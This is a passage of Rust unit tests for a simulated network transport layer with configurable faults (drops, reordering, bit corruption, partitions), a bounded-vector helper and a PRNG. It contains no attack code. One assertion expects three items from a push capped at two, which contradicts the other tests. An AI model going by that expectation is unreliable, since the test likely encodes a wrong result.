        assert_eq!(vec, vec![999]);

        // Exact capacity boundary
        let mut vec = vec![1, 2, 3];
        push_bounded(&mut vec, 999, 3);
        assert_eq!(vec, vec![2, 3, 999]); // Should remove 1 to make room

        // Very large capacity with small vec
        let mut vec = vec![1];
        push_bounded(&mut vec, 999, 1_000_000);
        assert_eq!(vec, vec![1, 999]);

        // Saturating arithmetic test - huge existing vec vs small capacity
        let mut huge_vec: Vec<i32> = (0..100_000).collect();
        push_bounded(&mut huge_vec, 999, 5);
        assert_eq!(huge_vec.len(), 5);
        assert_eq!(huge_vec[4], 999);

        // Empty vec with normal capacity
        let mut empty_vec: Vec<i32> = vec![];
        push_bounded(&mut empty_vec, 42, 10);
        assert_eq!(empty_vec, vec![42]);

        // Overflow calculation edge case - vec.len() close to usize::MAX
        // Note: This is theoretical since we can't actually create such a large vec in practice
        let mut normal_vec = vec![1, 2, 3, 4, 5];
        // Test the arithmetic doesn't panic with normal values
        push_bounded(&mut normal_vec, 999, 2);
        assert_eq!(normal_vec, vec![4, 5, 999]);

        // Stress test with rapid additions
        let mut stress_vec = Vec::new();
        for i in 0..1000 {
            push_bounded(&mut stress_vec, i, 100);
        }
        assert_eq!(stress_vec.len(), 100);
        assert_eq!(stress_vec[99], 999); // Last added item
    }

    /// Test LinkFaultConfig::validate with extreme probability values
    #[test]
    fn test_link_fault_config_validate_negative_paths() {
        // Invalid negative probability
        let config_negative = LinkFaultConfig {
            drop_probability: -0.1,
            ..Default::default()
        };
        let err = config_negative.validate().unwrap_err();
        match err {
            VirtualTransportError::InvalidProbability { field, value } => {
                assert_eq!(field, "drop_probability");
                assert_eq!(value, -0.1);
            }
            _ => panic!("Expected InvalidProbability error"),
        }

        // Invalid probability > 1.0
        let config_high = LinkFaultConfig {
            drop_probability: 1.0001,
            ..Default::default()
        };
        assert!(config_high.validate().is_err());

        // Edge case: exactly 0.0 (should be valid)
        let config_zero = LinkFaultConfig {
            drop_probability: 0.0,
            ..Default::default()
        };
        assert!(config_zero.validate().is_ok());

        // Edge case: exactly 1.0 (should be valid)
        let config_one = LinkFaultConfig {
            drop_probability: 1.0,
            ..Default::default()
        };
        assert!(config_one.validate().is_ok());

        // Very small negative (precision edge case)
        let config_tiny_neg = LinkFaultConfig {
            drop_probability: -f64::EPSILON,
            ..Default::default()
        };
        assert!(config_tiny_neg.validate().is_err());

        // Very small positive over 1.0
        let config_tiny_high = LinkFaultConfig {
            drop_probability: 1.0 + f64::EPSILON,
            ..Default::default()
        };
        assert!(config_tiny_high.validate().is_err());

        // NaN probability (should be invalid)
        let config_nan = LinkFaultConfig {
            drop_probability: f64::NAN,
            ..Default::default()
        };
        assert!(config_nan.validate().is_err());

        // Infinity probability (should be invalid)
        let config_inf = LinkFaultConfig {
            drop_probability: f64::INFINITY,
            ..Default::default()
        };
        assert!(config_inf.validate().is_err());

        // Negative infinity
        let config_neg_inf = LinkFaultConfig {
            drop_probability: f64::NEG_INFINITY,
            ..Default::default()
        };
        assert!(config_neg_inf.validate().is_err());

        // Very large finite values (but invalid)
        let config_huge = LinkFaultConfig {
            drop_probability: 1e308,
            ..Default::default()
        };
        assert!(config_huge.validate().is_err());

        // Maximum values for other fields should be ok
        let config_max_others = LinkFaultConfig {
            drop_probability: 0.5,
            reorder_depth: usize::MAX,
            corrupt_bit_count: usize::MAX,
            delay_ticks: u64::MAX,
            partition: true,
        };
        assert!(config_max_others.validate().is_ok());
    }

    /// Test LinkState::link_id with unusual node names
    #[test]
    fn test_link_state_link_id_negative_paths() {
        // Empty source and target
        let link_empty = LinkState::new(String::new(), String::new(), LinkFaultConfig::default());
        assert_eq!(link_empty.link_id(), "->");

        // One empty, one non-empty
        let link_partial = LinkState::new("node".to_string(), String::new(), LinkFaultConfig::default());
        assert_eq!(link_partial.link_id(), "node->");

        // Unicode node names
        let link_unicode = LinkState::new("node_🌟".to_string(), "target_🔒".to_string(), LinkFaultConfig::default());
        assert_eq!(link_unicode.link_id(), "node_🌟->target_🔒");

        // Very long node names
        let long_source = "s".repeat(100_000);
        let long_target = "t".repeat(100_000);
        let link_long = LinkState::new(long_source.clone(), long_target.clone(), LinkFaultConfig::default());
        assert_eq!(link_long.link_id(), format!("{}->{}", long_source, long_target));

        // Node names with special characters
        let link_special = LinkState::new("node\0\r\n\t".to_string(), "target->weird".to_string(), LinkFaultConfig::default());
        assert_eq!(link_special.link_id(), "node\0\r\n\t->target->weird");

        // Node names that could cause confusion (already contain ->)
        let link_confusing = LinkState::new("source->fake".to_string(), "real->target".to_string(), LinkFaultConfig::default());
        assert_eq!(link_confusing.link_id(), "source->fake->real->target");
    }

    /// Test Xorshift64 PRNG with edge case seeds and boundary conditions
    #[test]
    fn test_xorshift64_negative_paths() {
        // Zero seed should be converted to 1
        let mut rng_zero = Xorshift64::new(0);
        assert_ne!(rng_zero.state, 0); // Should be 1
        let val1 = rng_zero.next_u64();
        let val2 = rng_zero.next_u64();
        assert_ne!(val1, val2); // Should produce different values

        // Maximum u64 seed
        let mut rng_max = Xorshift64::new(u64::MAX);
        assert_eq!(rng_max.state, u64::MAX);
        let max_val = rng_max.next_u64();
        assert!(max_val > 0); // Should produce valid output

        // Seed = 1 (boundary case)
        let mut rng_one = Xorshift64::new(1);
        let one_val = rng_one.next_u64();
        assert_ne!(one_val, 1);

        // Test next_f64 boundaries
        let mut rng_float = Xorshift64::new(42);
        for _ in 0..1000 {
            let f = rng_float.next_f64();
            assert!(f >= 0.0);
            assert!(f < 1.0);
            assert!(f.is_finite());
        }

        // Determinism test
        let mut rng1 = Xorshift64::new(12345);
        let mut rng2 = Xorshift64::new(12345);
        for _ in 0..100 {
            assert_eq!(rng1.next_u64(), rng2.next_u64());
            assert_eq!(rng1.next_f64(), rng2.next_f64());
        }

        // Test state progression doesn't get stuck at zero
        let mut rng_prog = Xorshift64::new(1);
        let mut seen_zero_state = false;
        for _ in 0..10000 {
            rng_prog.next_u64();
            if rng_prog.state == 0 {
                seen_zero_state = true;
                break;
            }
        }
        assert!(!seen_zero_state, "PRNG state should never become zero");
    }

    /// Test VirtualTransportLayer with extreme configurations and edge cases
    #[test]
    fn test_virtual_transport_layer_extreme_cases() {
        // Zero event log capacity
        let mut vt_zero_log = VirtualTransportLayer::with_event_log_capacity(42, 0);
        assert_eq!(vt_zero_log.event_log_capacity(), 1); // Should be clamped to 1
        vt_zero_log.create_link("a", "b", LinkFaultConfig::default()).unwrap();
        assert_eq!(vt_zero_log.event_log().len(), 1); // Should store exactly 1 event

        // Huge event log capacity
        let vt_huge_log = VirtualTransportLayer::with_event_log_capacity(42, 1_000_000);
        assert_eq!(vt_huge_log.event_log_capacity(), 1_000_000);

        // Message ID exhaustion
        let mut vt_exhausted = VirtualTransportLayer::new(42);
        vt_exhausted.next_message_id = u64::MAX;
        vt_exhausted.create_link("a", "b", LinkFaultConfig::default()).unwrap();

        // First send should work (uses u64::MAX)
        let last_id = vt_exhausted.send_message("a", "b", b"last".to_vec()).unwrap();
        assert_eq!(last_id, u64::MAX);

        // Next send should fail (next_message_id wraps to 0)
        let err = vt_exhausted.send_message("a", "b", b"overflow".to_vec()).unwrap_err();
        assert!(matches!(err, VirtualTransportError::MessageIdExhausted));

        // Maximum tick values
        let mut vt_max_tick = VirtualTransportLayer::new(42);
        vt_max_tick.current_tick = u64::MAX - 5;
        vt_max_tick.advance_tick(u64::MAX); // Should saturate, not overflow
        assert_eq!(vt_max_tick.current_tick(), u64::MAX);

        // Zero tick advance
        let mut vt_zero_advance = VirtualTransportLayer::new(42);
        let initial_tick = vt_zero_advance.current_tick();
        vt_zero_advance.advance_tick(0);
        assert_eq!(vt_zero_advance.current_tick(), initial_tick);

        // Maximum link count scenario
        let mut vt_max_links = VirtualTransportLayer::new(42);
        for i in 0..1000 {
            vt_max_links.create_link(&format!("node{}", i), &format!("target{}", i), LinkFaultConfig::default()).unwrap();
        }
        assert_eq!(vt_max_links.link_count(), 1000);

        // Stats with maximum values
        let stats_max = vt_max_links.stats();
        assert_eq!(stats_max.active_links, 1000);

        // Reset should clear everything
        vt_max_links.reset();
        assert_eq!(vt_max_links.link_count(), 0);
        assert_eq!(vt_max_links.current_tick(), 0);
        assert_eq!(vt_max_links.total_messages, 0);
        assert!(vt_max_links.event_log().is_empty());
    }

    /// Test apply_corruption with edge case payloads and bit counts
    #[test]
    fn test_apply_corruption_negative_paths() {
        let mut vt = VirtualTransportLayer::new(42);

        // Empty payload should return 0 bits flipped
        let mut empty_payload = vec![];
        let flipped = vt.apply_corruption(&mut empty_payload, 10);
        assert_eq!(flipped, 0);
        assert!(empty_payload.is_empty());

        // Single byte payload with excessive bit flip request
        let mut single_byte = vec![0xFF];
        let flipped_single = vt.apply_corruption(&mut single_byte, 100);
        assert_eq!(flipped_single, 8); // Maximum 8 bits in 1 byte

        // Zero bit count should do nothing
        let mut no_corruption = vec![0xAB, 0xCD, 0xEF];
        let original = no_corruption.clone();
        let flipped_zero = vt.apply_corruption(&mut no_corruption, 0);
        assert_eq!(flipped_zero, 0);
        assert_eq!(no_corruption, original);

        // Bit count equal to total bits
        let mut exact_bits = vec![0x00; 2]; // 16 bits total
        let flipped_exact = vt.apply_corruption(&mut exact_bits, 16);
        assert_eq!(flipped_exact, 16);

        // Very large payload with small corruption
        let mut large_payload = vec![0x00; 100_000];
        let flipped_large = vt.apply_corruption(&mut large_payload, 5);
        assert_eq!(flipped_large, 5);
        // Count actual bit differences
        let bit_diffs = large_payload.iter().map(|&b| b.count_ones()).sum::<u32>();
        assert_eq!(bit_diffs, 5);

        // All bits set, then corrupt (should flip some to 0)
        let mut all_ones = vec![0xFF; 10];
        let original_ones = all_ones.clone();
        vt.apply_corruption(&mut all_ones, 20);
        // Should be different from original
        assert_ne!(all_ones, original_ones);

        // Deterministic corruption with same seed
        let mut payload1 = vec![0x00; 8];
        let mut payload2 = vec![0x00; 8];

        let mut vt1 = VirtualTransportLayer::new(12345);
        let mut vt2 = VirtualTransportLayer::new(12345);

        vt1.apply_corruption(&mut payload1, 10);
        vt2.apply_corruption(&mut payload2, 10);

        assert_eq!(payload1, payload2); // Same seed should produce same corruption pattern

        // Maximum possible corruption on small payload
        let mut tiny_payload = vec![0x00];
        let max_flipped = vt.apply_corruption(&mut tiny_payload, usize::MAX);
        assert_eq!(max_flipped, 8); // Can't flip more bits than exist
    }

    /// Test message sending and delivery with extreme payloads and configurations
    #[test]
    fn test_message_extreme_scenarios() {
        // Very large payload
        let mut vt_large = VirtualTransportLayer::new(42);
        vt_large.create_link("a", "b", LinkFaultConfig::default()).unwrap();
        let huge_payload = vec![0x42; 10_000_000]; // 10MB payload
        let msg_id = vt_large.send_message("a", "b", huge_payload.clone()).unwrap();
        assert!(msg_id > 0);

        let delivered = vt_large.deliver_next("a->b").unwrap().unwrap();
        assert_eq!(delivered.payload.len(), 10_000_000);
        assert_eq!(delivered.payload, huge_payload);

        // Empty payload
        let mut vt_empty = VirtualTransportLayer::new(42);
        vt_empty.create_link("a", "b", LinkFaultConfig::default()).unwrap();
        let empty_msg_id = vt_empty.send_message("a", "b", vec![]).unwrap();
        let delivered_empty = vt_empty.deliver_next("a->b").unwrap().unwrap();
        assert!(delivered_empty.payload.is_empty());

        // Maximum delay ticks
        let mut vt_max_delay = VirtualTransportLayer::new(42);
        let max_delay_config = LinkFaultConfig {
            delay_ticks: u64::MAX,
            ..Default::default()
        };
        vt_max_delay.create_link("a", "b", max_delay_config).unwrap();
        vt_max_delay.send_message("a", "b", b"delayed".to_vec()).unwrap();

        // Should not be deliverable even after advancing to max tick
        vt_max_delay.advance_tick(u64::MAX);
        let result = vt_max_delay.deliver_next("a->b").unwrap();
        assert!(result.is_none()); // Still not deliverable due to overflow protection

        // Maximum reorder depth
        let mut vt_reorder = VirtualTransportLayer::new(42);
        let reorder_config = LinkFaultConfig {
            reorder_depth: 1000,
            ..Default::default()
        };
        vt_reorder.create_link("a", "b", reorder_config).unwrap();

        // Send many messages to trigger reordering
        for i in 0..2000 {
            vt_reorder.send_message("a", "b", vec![i as u8]).unwrap();
        }
        assert!(vt_reorder.reordered_messages > 0);

        // Deliver all and verify we get all messages back (in some order)
        let all_delivered = vt_reorder.deliver_all("a->b").unwrap();
        assert_eq!(all_delivered.len(), 2000);

        // Maximum corruption on large payload
        let mut vt_corrupt = VirtualTransportLayer::new(42);
        let corrupt_config = LinkFaultConfig {
            corrupt_bit_count: 80_000, // More bits than in 1KB
            ..Default::default()
        };
        vt_corrupt.create_link("a", "b", corrupt_config).unwrap();
        let kb_payload = vec![0x00; 1024]; // 1KB = 8192 bits
        vt_corrupt.send_message("a", "b", kb_payload).unwrap();
        assert!(vt_corrupt.corrupted_messages > 0);

        let corrupted_msg = vt_corrupt.deliver_next("a->b").unwrap().unwrap();
        // Should have exactly 8192 bits flipped (all bits in 1KB)
        let total_ones = corrupted_msg.payload.iter().map(|&b| b.count_ones()).sum::<u32>();
        assert_eq!(total_ones, 8192);
    }

    /// Test link operations with extreme node names and link IDs
    #[test]
    fn test_link_operations_extreme_names() {
        let mut vt = VirtualTransportLayer::new(42);

        // Unicode node names
        let unicode_source = "源节点_🌟";
        let unicode_target = "目标节点_🔒";
        let unicode_link_id = vt.create_link(unicode_source, unicode_target, LinkFaultConfig::default()).unwrap();
        assert_eq!(unicode_link_id, format!("{}->{}",unicode_source, unicode_target));

        // Very long node names
        let long_source = "s".repeat(100_000);
        let long_target = "t".repeat(100_000);
        let long_link_id = vt.create_link(&long_source, &long_target, LinkFaultConfig::default()).unwrap();
        assert!(long_link_id.len() > 200_000);

        // Node names with special characters
        let special_source = "node\0\r\n\t\"'\\";
        let special_target = "target/\\?*<>|:";
        let special_link_id = vt.create_link(special_source, special_target, LinkFaultConfig::default()).unwrap();

        // Should be able to send messages on all these links
        vt.send_message(unicode_source, unicode_target, b"unicode".to_vec()).unwrap();
        vt.send_message(&long_source, &long_target, b"long".to_vec()).unwrap();
        vt.send_message(special_source, special_target, b"special".to_vec()).unwrap();

        // Destroy links with extreme names
        vt.destroy_link(&unicode_link_id).unwrap();
        vt.destroy_link(&long_link_id).unwrap();
        vt.destroy_link(&special_link_id).unwrap();

        assert_eq!(vt.link_count(), 0);

        // Link operations on non-existent extreme link IDs
        let fake_long_id = "x".repeat(1_000_000);
        let err_long = vt.destroy_link(&fake_long_id).unwrap_err();
        assert!(matches!(err_long, VirtualTransportError::LinkNotFound { .. }));

        let fake_unicode_id = "🚀不存在的链接🛡️";
        let err_unicode = vt.activate_partition(fake_unicode_id).unwrap_err();
        assert!(matches!(err_unicode, VirtualTransportError::LinkNotFound { .. }));

        // Empty node names (edge case)
        let empty_link_id = vt.create_link("", "", LinkFaultConfig::default()).unwrap();
        assert_eq!(empty_link_id, "->");
        vt.send_message("", "", b"empty".to_vec()).unwrap();
        let delivered = vt.deliver_next("->").unwrap().unwrap();
        assert_eq!(delivered.source, "");
        assert_eq!(delivered.target, "");
    }

    /// Test event log capacity and overflow handling
    #[test]
    fn test_event_log_capacity_overflow() {
        // Small capacity with many events
        let mut vt_small = VirtualTransportLayer::with_event_log_capacity(42, 5);

        // Create several links (each creates an event)
        for i in 0..10 {
            vt_small.create_link(&format!("a{}", i), &format!("b{}", i), LinkFaultConfig::default()).unwrap();
        }

        // Should only keep the last 5 events
        assert_eq!(vt_small.event_log().len(), 5);

        // Add more events through partition operations
        for i in 0..10 {
            let link_id = format!("a{}->b{}", i, i);
            if vt_small.links.contains_key(&link_id) {
                vt_small.activate_partition(&link_id).unwrap();
                vt_small.heal_partition(&link_id).unwrap();
            }
        }

        // Should still only have 5 events (most recent)
        assert_eq!(vt_small.event_log().len(), 5);

        // Test capacity 1 (minimum)
        let mut vt_one = VirtualTransportLayer::with_event_log_capacity(42, 1);
        vt_one.create_link("a", "b", LinkFaultConfig::default()).unwrap();
        vt_one.send_message("a", "b", b"msg".to_vec()).unwrap();

        // Should only have 1 event (the most recent)
        assert_eq!(vt_one.event_log().len(), 1);
        match &vt_one.event_log()[0] {
            TransportEvent::MessageSent { .. } => {}, // Expected
            _ => panic!("Expected MessageSent event as most recent"),
        }
    }

    // -- Test 17: event log capacity evicts oldest entries first
    #[test]
    fn test_event_log_capacity_enforces_oldest_first_eviction() {
        let mut vt = VirtualTransportLayer::with_event_log_capacity(42, 3);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.send_message("a", "b", b"test".to_vec()).unwrap();
        vt.activate_partition("a->b").unwrap();
        vt.heal_partition("a->b").unwrap();

        let log = vt.event_log();
        assert_eq!(vt.event_log_capacity(), 3);
        assert_eq!(log.len(), 3);
        assert_eq!(log[0].event_code(), event_codes::VT_001);
        assert_eq!(log[1].event_code(), event_codes::VT_005);
        assert_eq!(log[2].event_code(), event_codes::VT_006);
    }

    // -- Test 18: event codes are distinct
    #[test]
    fn test_event_codes_distinct() {
        let codes = [
            event_codes::VT_001,
            event_codes::VT_002,
            event_codes::VT_003,
            event_codes::VT_004,
            event_codes::VT_005,
            event_codes::VT_006,
            event_codes::VT_007,
            event_codes::VT_008,
        ];
        let mut seen = std::collections::BTreeSet::new();
        for c in &codes {
            assert!(seen.insert(*c), "Duplicate event code: {c}");
        }
        assert_eq!(seen.len(), 8);
    }

    // -- Test 19: error codes are distinct
    #[test]
    fn test_error_codes_distinct() {
        let codes = [
            error_codes::ERR_VT_LINK_EXISTS,
            error_codes::ERR_VT_LINK_NOT_FOUND,
            error_codes::ERR_VT_INVALID_PROBABILITY,
            error_codes::ERR_VT_PARTITIONED,
            error_codes::ERR_VT_MESSAGE_ID_EXHAUSTED,
        ];
        let mut seen = std::collections::BTreeSet::new();
        for c in &codes {
            assert!(seen.insert(*c), "Duplicate error code: {c}");
        }
        assert_eq!(seen.len(), 5);
    }

    // -- Test 20: invariants are distinct
    #[test]
    fn test_invariants_distinct() {
        let invs = [
            invariants::INV_VT_DETERMINISTIC,
            invariants::INV_VT_DELIVERY_ORDER,
            invariants::INV_VT_DROP_RATE,
            invariants::INV_VT_CORRUPT_BITS,
        ];
        let mut seen = std::collections::BTreeSet::new();
        for i in &invs {
            assert!(seen.insert(*i), "Duplicate invariant: {i}");
        }
        assert_eq!(seen.len(), 4);
    }

    // -- Test 21: reset clears state but preserves seed
    #[test]
    fn test_reset() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.send_message("a", "b", b"msg".to_vec()).unwrap();
        assert_eq!(vt.total_messages, 1);

        vt.reset();
        assert_eq!(vt.total_messages, 0);
        assert_eq!(vt.link_count(), 0);
        assert!(vt.event_log().is_empty());
        assert_eq!(vt.rng_seed, 42);
    }

    // -- Test 22: update link config
    #[test]
    fn test_update_link_config() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();

        let new_config = LinkFaultConfig {
            drop_probability: 0.5,
            ..Default::default()
        };
        vt.update_link_config("a->b", new_config).unwrap();

        let link = vt.links.get("a->b").unwrap();
        assert!((link.config.drop_probability - 0.5).abs() < f64::EPSILON);
    }

    // -- Test 23: deliver_all returns all messages
    #[test]
    fn test_deliver_all() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();

        for i in 0..3 {
            vt.send_message("a", "b", vec![i]).unwrap();
        }

        let delivered = vt.deliver_all("a->b").unwrap();
        assert_eq!(delivered.len(), 3);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 0);
    }

    // -- Test 23b: terminal message ID is issued once, then the layer fails closed
    #[test]
    fn test_message_id_exhaustion_fails_closed_after_terminal_id() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.next_message_id = u64::MAX;

        let terminal = vt.send_message("a", "b", b"terminal".to_vec()).unwrap();
        assert_eq!(terminal, u64::MAX);

        let err = vt
            .send_message("a", "b", b"after-terminal".to_vec())
            .unwrap_err();
        assert!(matches!(err, VirtualTransportError::MessageIdExhausted));
        assert_eq!(format!("{}", err), error_codes::ERR_VT_MESSAGE_ID_EXHAUSTED);
        assert_eq!(vt.total_messages, 1);
    }

    // -- Test 24: message Display implementation
    #[test]
    fn test_message_display() {
        let msg = Message {
            id: 1,
            source: "node_a".to_string(),
            target: "node_b".to_string(),
            payload: vec![0; 10],
            tick_created: 5,
            tick_delivered: None,
        };
        let display = format!("{}", msg);
        assert!(display.contains("id=1"));
        assert!(display.contains("node_a->node_b"));
        assert!(display.contains("10 bytes"));
        assert!(display.contains("tick=5"));
    }

    // -- Test 25: link_state link_id format
    #[test]
    fn test_link_state_link_id() {
        let ls = LinkState::new(
            "alpha".to_string(),
            "beta".to_string(),
            LinkFaultConfig::no_faults(),
        );
        assert_eq!(ls.link_id(), "alpha->beta");
        assert!(ls.active);
    }

    // -- Test 26: default transport layer
    #[test]
    fn test_default() {
        let vt = VirtualTransportLayer::default();
        assert_eq!(vt.rng_seed, 42);
        assert_eq!(vt.total_messages, 0);
        assert_eq!(vt.link_count(), 0);
    }

    #[test]
    fn invalid_nan_probability_rejected_without_creating_link() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            drop_probability: f64::NAN,
            ..Default::default()
        };

        let err = vt.create_link("a", "b", config).unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability {
                ref field,
                value
            } if field == "drop_probability" && value.is_nan()
        ));
        assert_eq!(vt.link_count(), 0);
        assert!(vt.event_log().is_empty());
    }

    #[test]
    fn invalid_negative_probability_rejected_without_creating_link() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            drop_probability: -0.01,
            ..Default::default()
        };

        let err = vt.create_link("a", "b", config).unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability {
                ref field,
                value
            } if field == "drop_probability" && value < 0.0
        ));
        assert_eq!(vt.link_count(), 0);
        assert!(vt.event_log().is_empty());
    }

    #[test]
    fn duplicate_link_preserves_original_config_and_event_log() {
        let mut vt = VirtualTransportLayer::new(42);
        let original = LinkFaultConfig {
            delay_ticks: 7,
            ..Default::default()
        };
        vt.create_link("a", "b", original).unwrap();
        let events_before = vt.event_log().len();

        let err = vt
            .create_link(
                "a",
                "b",
                LinkFaultConfig {
                    drop_probability: 1.0,
                    partition: true,
                    ..Default::default()
                },
            )
            .unwrap_err();

        assert!(matches!(err, VirtualTransportError::LinkExists { .. }));
        assert_eq!(vt.link_count(), 1);
        assert_eq!(vt.event_log().len(), events_before);
        let link = vt.links.get("a->b").expect("original link should remain");
        assert_eq!(link.config.delay_ticks, 7);
        assert!(!link.config.partition);
        assert_eq!(link.config.drop_probability, 0.0);
    }

    #[test]
    fn send_to_missing_link_does_not_consume_message_id_or_stats() {
        let mut vt = VirtualTransportLayer::new(42);

        let err = vt
            .send_message("missing-a", "missing-b", b"payload".to_vec())
            .unwrap_err();

        assert!(matches!(err, VirtualTransportError::LinkNotFound { .. }));
        assert_eq!(vt.next_message_id, 1);
        assert_eq!(vt.total_messages, 0);
        assert_eq!(vt.dropped_messages, 0);
        assert!(vt.event_log().is_empty());
    }

    #[test]
    fn partitioned_send_does_not_consume_message_id_or_increment_counters() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "a",
            "b",
            LinkFaultConfig {
                partition: true,
                ..Default::default()
            },
        )
        .unwrap();
        let events_before = vt.event_log().len();

        let err = vt.send_message("a", "b", b"blocked".to_vec()).unwrap_err();

        assert!(matches!(err, VirtualTransportError::Partitioned { .. }));
        assert_eq!(vt.next_message_id, 1);
        assert_eq!(vt.total_messages, 0);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 0);
        assert_eq!(vt.event_log().len(), events_before);
    }

    #[test]
    fn update_missing_link_with_valid_config_preserves_existing_links() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        let events_before = vt.event_log().len();

        let err = vt
            .update_link_config(
                "b->c",
                LinkFaultConfig {
                    drop_probability: 0.5,
                    ..Default::default()
                },
            )
            .unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::LinkNotFound { ref link_id } if link_id == "b->c"
        ));
        assert_eq!(vt.link_count(), 1);
        assert_eq!(vt.links.get("a->b").unwrap().config.drop_probability, 0.0);
        assert_eq!(vt.event_log().len(), events_before);
    }

    #[test]
    fn update_missing_link_with_invalid_config_reports_validation_first() {
        let mut vt = VirtualTransportLayer::new(42);

        let err = vt
            .update_link_config(
                "missing->link",
                LinkFaultConfig {
                    drop_probability: 2.0,
                    ..Default::default()
                },
            )
            .unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability { .. }
        ));
        assert_eq!(vt.link_count(), 0);
        assert!(vt.event_log().is_empty());
    }

    #[test]
    fn deliver_from_partitioned_link_preserves_buffered_message() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.send_message("a", "b", b"queued".to_vec()).unwrap();
        vt.activate_partition("a->b").unwrap();
        let events_before = vt.event_log().len();

        let err = vt
            .deliver_next("a->b")
            .expect_err("partitioned delivery must fail closed");

        assert!(matches!(err, VirtualTransportError::Partitioned { .. }));
        assert_eq!(vt.buffered_count("a->b").unwrap(), 1);
        assert_eq!(vt.stats().delivered_messages, 0);
        assert_eq!(vt.event_log().len(), events_before);
    }

    #[test]
    fn activate_missing_link_preserves_existing_links_and_event_log() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        let events_before = vt.event_log().len();

        let err = vt.activate_partition("b->c").unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::LinkNotFound { ref link_id } if link_id == "b->c"
        ));
        assert_eq!(vt.link_count(), 1);
        assert!(!vt.links.get("a->b").unwrap().config.partition);
        assert_eq!(vt.event_log().len(), events_before);
    }

    #[test]
    fn heal_missing_link_preserves_existing_partition_state() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "a",
            "b",
            LinkFaultConfig {
                partition: true,
                ..Default::default()
            },
        )
        .unwrap();
        let events_before = vt.event_log().len();

        let err = vt.heal_partition("missing->link").unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::LinkNotFound { ref link_id } if link_id == "missing->link"
        ));
        assert!(vt.links.get("a->b").unwrap().config.partition);
        assert_eq!(vt.event_log().len(), events_before);
    }

    #[test]
    fn buffered_count_missing_link_reports_error_without_side_effects() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.send_message("a", "b", b"queued".to_vec()).unwrap();
        let stats_before = vt.stats();

        let err = vt.buffered_count("missing->link").unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::LinkNotFound { ref link_id } if link_id == "missing->link"
        ));
        assert_eq!(vt.stats().total_messages, stats_before.total_messages);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 1);
    }

    #[test]
    fn deliver_all_missing_link_fails_without_draining_other_buffers() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.send_message("a", "b", b"queued".to_vec()).unwrap();

        let err = vt.deliver_all("missing->link").unwrap_err();

        assert!(matches!(err, VirtualTransportError::LinkNotFound { .. }));
        assert_eq!(vt.buffered_count("a->b").unwrap(), 1);
        assert_eq!(vt.stats().delivered_messages, 0);
    }

    #[test]
    fn update_existing_link_with_invalid_config_preserves_old_config() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "a",
            "b",
            LinkFaultConfig {
                delay_ticks: 9,
                ..Default::default()
            },
        )
        .unwrap();

        let err = vt
            .update_link_config(
                "a->b",
                LinkFaultConfig {
                    drop_probability: f64::INFINITY,
                    partition: true,
                    ..Default::default()
                },
            )
            .unwrap_err();

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability { ref field, value }
                if field == "drop_probability" && value.is_infinite()
        ));
        let link = vt.links.get("a->b").unwrap();
        assert_eq!(link.config.delay_ticks, 9);
        assert!(!link.config.partition);
        assert_eq!(link.config.drop_probability, 0.0);
    }

    #[test]
    fn dropped_terminal_message_id_still_exhausts_future_ids() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "a",
            "b",
            LinkFaultConfig {
                drop_probability: 1.0,
                ..Default::default()
            },
        )
        .unwrap();
        vt.next_message_id = u64::MAX;

        let terminal = vt
            .send_message("a", "b", b"drop-terminal".to_vec())
            .unwrap();
        let err = vt
            .send_message("a", "b", b"after-terminal".to_vec())
            .unwrap_err();

        assert_eq!(terminal, u64::MAX);
        assert!(matches!(err, VirtualTransportError::MessageIdExhausted));
        assert_eq!(vt.total_messages, 1);
        assert_eq!(vt.dropped_messages, 1);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 0);
    }

    #[test]
    fn corruption_config_on_empty_payload_does_not_increment_corruption_count() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "a",
            "b",
            LinkFaultConfig {
                corrupt_bit_count: 128,
                ..Default::default()
            },
        )
        .unwrap();

        vt.send_message("a", "b", Vec::new()).unwrap();
        let delivered = vt.deliver_next("a->b").unwrap().unwrap();

        assert!(delivered.payload.is_empty());
        assert_eq!(vt.corrupted_messages, 0);
        assert!(
            !vt.event_log()
                .iter()
                .any(|event| event.event_code() == event_codes::VT_004)
        );
    }

    #[test]
    fn push_bounded_zero_capacity_clears_without_retaining_new_item() {
        let mut values = vec![1, 2, 3];

        push_bounded(&mut values, 4, 0);

        assert!(values.is_empty());
    }
}

#[cfg(test)]
